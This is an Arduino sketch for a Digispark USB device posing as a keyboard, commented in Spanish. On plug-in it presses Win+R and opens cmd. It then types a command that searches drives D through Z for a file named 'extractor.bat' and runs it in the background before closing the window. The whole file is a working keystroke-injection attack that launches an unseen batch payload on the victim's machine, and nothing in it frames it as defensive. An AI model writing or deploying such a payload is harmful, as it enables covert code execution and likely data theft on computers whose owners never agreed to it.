#include "DigiKeyboard.h"

void setup() {
  // vacío
}

void loop() {
  DigiKeyboard.delay(2000);

  // Abrir Ejecutar (Win + R)
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);

  // Abrir CMD
  DigiKeyboard.print("cmd");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1500);

  // Ejecutar comando para buscar y correr el .bat
  DigiKeyboard.print("for %d in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do if exist %d:\\extractor.bat start \"\" /b %d:\\extractor.bat & exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  // Esperar un poco
  DigiKeyboard.delay(5000);

  // Loop infinito para que no se repita
  for(;;){}
}